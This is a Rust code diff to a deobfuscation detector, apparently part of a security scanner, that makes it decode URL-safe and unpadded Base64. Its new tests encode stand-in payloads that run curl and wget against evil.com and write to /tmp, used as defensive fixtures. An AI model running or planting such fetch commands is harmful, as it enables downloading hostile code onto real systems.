@@ -7,8 +7,12 @@ use std::sync::LazyLock;
 pub struct Deobfuscator;
 
 static BASE64_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?")
-        .expect("BASE64 regex")
+    // Match both the standard (`+`/`/`) and URL-safe (`-`/`_`) alphabets, with or
+    // without `=` padding. A single run may be standard OR URL-safe; `decode_base64`
+    // tries every engine variant, so an over-broad match is harmless (it just fails
+    // to decode). Length >= 16 keeps the original minimum; the `< 20` guard in
+    // `decode_base64` still filters short candidates.
+    Regex::new(r"[A-Za-z0-9+/_-]{16,}={0,2}").expect("BASE64 regex")
 });
 static HEX_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?:\\x[0-9A-Fa-f]{2}){4,}|(?:0x[0-9A-Fa-f]{2}){4,}").expect("HEX regex")
@@ -67,8 +71,7 @@ impl Deobfuscator {
                 continue;
             }
 
-            if let Ok(decoded_bytes) = base64::engine::general_purpose::STANDARD.decode(encoded)
-                && let Ok(decoded_str) = String::from_utf8(decoded_bytes)
+            if let Some(decoded_str) = Self::try_decode_base64_variants(encoded)
                 && self.is_suspicious(&decoded_str)
             {
                 results.push(DecodedContent {
@@ -80,6 +83,27 @@ impl Deobfuscator {
         }
 
         results
+    }
+
+    /// Try decoding a Base64 candidate with every common engine variant and
+    /// return the first result that is valid UTF-8.
+    ///
+    /// Covers standard and URL-safe alphabets, padded and unpadded. The `base64`
+    /// crate rejects the "wrong" alphabet and mismatched padding, so a payload
+    /// using URL-safe or unpadded Base64 (both ubiquitous) would otherwise be
+    /// silently dropped even though the standard-padded form is decoded.
+    fn try_decode_base64_variants(encoded: &str) -> Option<String> {
+        use base64::engine::general_purpose::{
+            STANDARD, STANDARD_NO_PAD, URL_SAFE, URL_SAFE_NO_PAD,
+        };
+
+        let engines: [&base64::engine::GeneralPurpose; 4] =
+            [&STANDARD, &STANDARD_NO_PAD, &URL_SAFE, &URL_SAFE_NO_PAD];
+
+        engines
+            .iter()
+            .filter_map(|engine| engine.decode(encoded).ok())
+            .find_map(|bytes| String::from_utf8(bytes).ok())
     }
 
     /// Decode hex encoded strings (\\x or 0x format)
@@ -452,6 +476,40 @@ mod tests {
         let content = "dGhpcyBpcyBhIG5vcm1hbCBzYWZlIHRleHQ="; // "this is a normal safe text"
         let results = deob.decode_base64(content);
         assert!(results.is_empty());
+    }
+
+    #[test]
+    fn test_decode_base64_unpadded_standard() {
+        let deob = Deobfuscator::new();
+        // "curl http://evil.com" standard base64 with the trailing '=' padding
+        // stripped. STANDARD.decode rejects this (InvalidPadding), and the regex
+        // only matches a 24-char (aligned) prefix, so the FULL payload is never
+        // recovered — assert full equality, not a substring, to expose the gap.
+        let content = "Y3VybCBodHRwOi8vZXZpbC5jb20";
+        let results = deob.decode_base64(content);
+        assert!(
+            results.iter().any(|r| r.decoded == "curl http://evil.com"),
+            "unpadded standard base64 should decode to the full payload, got: {:?}",
+            results.iter().map(|r| &r.decoded).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_decode_base64_url_safe() {
+        let deob = Deobfuscator::new();
+        // "wget http://evil.com/xyz??? > /tmp/p" in URL-safe base64 (unpadded).
+        // Contains '_' (URL-safe alphabet). The standard alphabet regex matches
+        // only the run before '_' and STANDARD.decode rejects the URL-safe
+        // alphabet, so the full payload is never recovered — assert equality.
+        let content = "d2dldCBodHRwOi8vZXZpbC5jb20veHl6Pz8_ID4gL3RtcC9w";
+        let results = deob.decode_base64(content);
+        assert!(
+            results
+                .iter()
+                .any(|r| r.decoded == "wget http://evil.com/xyz??? > /tmp/p"),
+            "URL-safe base64 should decode to the full payload, got: {:?}",
+            results.iter().map(|r| &r.decoded).collect::<Vec<_>>()
+        );
     }
 
     #[test]
